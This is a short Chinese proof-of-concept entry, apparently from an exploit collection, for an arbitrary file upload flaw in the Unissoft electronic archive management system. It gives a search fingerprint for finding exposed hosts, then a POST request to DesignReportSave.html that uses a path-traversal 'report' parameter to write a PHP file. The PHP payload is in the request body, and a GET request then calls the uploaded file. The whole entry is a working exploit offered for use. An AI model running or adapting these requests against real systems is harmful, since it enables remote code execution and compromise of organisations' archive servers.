# 紫光电子档案管理系统DesignReportSave文件上传

- **系统**：紫光电子档案管理系统DesignReportSave　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="www.unissoft.com"`
- **请求**：`POST /Setting/Report/DesignReportSave.html?report=../../../kwok111evs.php&token=java HTTP/1.1`
- **关键头**：`Content-Length: 55`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: winWidth=1920; winHeight=455`

**请求体 / payload**
```
aa=<?php echo 111*111;?>&userID=admin&fondsid=1&comid=1
GET /uploads/company1/kwok111evs.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Cookie: winWidth=1920; winHeight=455; PHPSESSID=93608d7843a8624feaf54b9e41b97e21
```
- **预期**：200　|　—